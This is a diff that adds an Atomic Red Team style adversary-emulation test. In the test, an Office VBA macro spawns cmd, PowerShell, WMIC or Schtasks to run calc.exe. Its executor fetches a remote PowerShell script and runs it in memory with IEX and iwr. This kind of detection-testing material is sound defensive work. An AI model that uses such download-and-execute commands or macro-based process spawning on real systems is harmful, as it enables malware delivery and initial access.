@@ -52,6 +52,44 @@ atomic_tests:
             $ExecutablePath = Join-Path -Path #{executable_location} -ChildPath #{executable_name}
             Remove-Item $ExecutablePath -ErrorAction Ignore
         name: powershell
+-   name: Office Product Spawning Suspicious LOLB
+    auto_generated_guid:
+    description: |
+        This Test uses a VBA macro to execute CMD.exe, Powershell.exe, Schtasks.exe, or WMIC.exe. Upon execution, the selected process will be launched and run calc.exe.
+        Execution is handled by [Invoke-MalDoc](https://github.com/CyborgSecurity/atomic-red-team/blob/Cyborg/ARTifacts/Initial_Access/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+    supported_platforms:
+    -   windows
+    input_arguments:
+        ms_product:
+            description: Which document type to use. The available choices are Word
+                or Excel
+            type: String
+            default: Word
+        ms_office_version:
+            description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+            type: String
+            default: '16.0'
+        macro_choice:
+            description: Which macro to embed within the document. The available choices
+                are (1) - CMD.exe, (2) - PowerShell.exe, (3) - WMIC.exe, (4) - Schtasks.exe
+            type: Integer
+            default: 1
+    dependency_executor_name: powershell
+    dependencies:
+    -   description: |
+            Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
+        prereq_command: |
+            If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+            $msword = New-Object -ComObject word.application
+            Stop-Process -Name WINWORD
+    executor:
+        command: |
+            IEX (iwr "https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/ARTifacts/Initial_Access/Invoke-MalDoc.ps1")
+            Invoke-MalDoc "#{macro_choice}" "#{ms_office_version}" "#{ms_product}"
+        cleanup_command: |
+            Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+        name: powershell
 -   name: OSTap Style Macro Execution
     auto_generated_guid: 8bebc690-18c7-4549-bc98-210f7019efff
     description: |
